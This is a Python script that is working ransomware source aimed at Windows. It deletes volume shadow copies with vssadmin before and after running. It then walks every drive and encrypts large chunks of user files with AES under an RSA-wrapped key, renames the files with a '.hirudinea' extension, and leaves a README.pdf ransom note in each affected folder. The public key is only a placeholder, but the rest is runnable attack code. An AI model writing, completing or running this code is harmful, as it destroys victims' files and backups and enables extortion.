import os
import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from fpdf import FPDF

def encrypt_section(file_path, cipher, start, end):
    """Encrypt a section of the file."""
    with open(file_path, 'r+b') as file:
        file.seek(start)
        data = file.read(end - start)
        encrypted_data = cipher.encrypt(data)
        file.seek(start)
        file.write(encrypted_data)

def delete_shadow_copies():
    """Delete system shadow copies using vssadmin utility."""
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True)

# RSA public key (hardcoded)
public_key = RSA.import_key('''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAn...[Your Public Key Here]...IDAQAB
-----END PUBLIC KEY-----''')

# Encrypt the AES key and IV with RSA
def rsa_encrypt(data, pub_key):
    rsa_cipher = PKCS1_OAEP.new(pub_key)
    return rsa_cipher.encrypt(data)

# Function to create a README.pdf file
def create_readme_pdf(directory):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Your files are encrypted!", ln=True, align='C')
    pdf.output(os.path.join(directory, "README.pdf"))

# Ignore directories
ignored_directories = {
    "$Recycle.Bin", "Boot", "Documents and Settings", "PerfLogs", 
    "Program Files", "Program Files (x86)", "ProgramData", "Recovery", 
    "System Volume Information", "Windows", "$RECYCLE.BIN"
}

# Ignore file extensions
ignored_extensions = {
    ".bat", ".bin", ".cab", ".cd", ".com", ".cur", ".diagaba", ".diagcfg", 
    ".diagpkg", ".drv", ".dll", ".exe", ".hlp", ".hta", ".ico", ".lnk", 
    ".msi", ".ocx", ".ps1", ".psm1", ".scr", ".sys", ".ini", "Thumbs.db", 
    ".url", ".iso"
}

# Find all present drives on a Windows system by letter from Z-A
drives = [f"{chr(letter)}:\\" for letter in range(90, 64, -1) if os.path.exists(f"{chr(letter)}:\\")]

# Creating an AES CRT cipher with a random key and a random IV
key = get_random_bytes(16)  # AES key must be either 16, 24, or 32 bytes long
iv = get_random_bytes(16)   # For AES, the IV is always 16 bytes long
cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=iv)

# RSA Encrypt the key and IV
encrypted_key = rsa_encrypt(key, public_key)
encrypted_iv = rsa_encrypt(iv, public_key)

# Delete system shadow copies before encryption
delete_shadow_copies()

# Parse all discovered drives for files
for drive in drives:
    for root, dirs, files in os.walk(drive):
        # Skip ignored directories
        if any(ignored_dir in root for ignored_dir in ignored_directories):
            continue

        encrypted_files = False
        for file in files:
            file_path = os.path.join(root, file)
            file_extension = os.path.splitext(file_path)[1]

            # Skip ignored file extensions
            if file_extension in ignored_extensions:
                continue

            try:
                # Check file size
                file_size = os.path.getsize(file_path)
                
                # Determine number of sections and size of each section
                if file_size <= 2 * 1024 * 1024:  # 0-2MB, no division
                    sections = [(0, min(1024 * 1024, file_size))]
                elif 2 * 1024 * 1024 < file_size <= 4 * 1024 * 1024:  # 2-4MB, divide into 2 sections
                    sections = [(0, 1024 * 1024), (2 * 1024 * 1024, min(file_size, 3 * 1024 * 1024))]
                else:  # >4MB, divide into 4 sections
                    section_size = file_size // 4
                    sections = [(i, min(i + 1024 * 1024, i + section_size)) for i in range(0, file_size, section_size)]

                # Encrypt and overwrite the first 1MB of each section
                for start, end in sections:
                    encrypt_section(file_path, cipher, start, end)

                # Rename file to add ".hirudinea" extension
                os.rename(file_path, file_path + ".hirudinea")

                # Append the RSA encrypted key and IV to the end of the file
                with open(file_path + ".hirudinea", 'ab') as file:
                    file.write(encrypted_key)
                    file.write(encrypted_iv)

                encrypted_files = True

            except (PermissionError, IOError):
                # Move on to the next file if a permission error occurs
                continue

        # Create README.pdf if any files were encrypted in the directory
        if encrypted_files:
            create_readme_pdf(root)

# Delete system shadow copies after encryption
delete_shadow_copies()

